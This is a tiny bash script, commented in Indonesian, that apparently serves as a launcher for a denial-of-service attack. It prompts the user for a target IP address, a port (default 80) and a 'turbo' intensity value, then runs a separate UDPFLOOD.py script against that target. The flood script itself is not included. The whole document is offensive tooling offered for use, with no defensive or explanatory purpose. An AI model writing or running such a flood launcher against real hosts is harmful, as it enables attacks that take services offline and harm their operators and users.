#script khusus input dos1
read -p "IP TARGET : " ip
read -p "PORT (DEFAULT :80) : " port
read -p "TURBO (DEFAULT : 1000) : " turbo
python3 UDPFLOOD.py -s$ip -p$port -t$turbo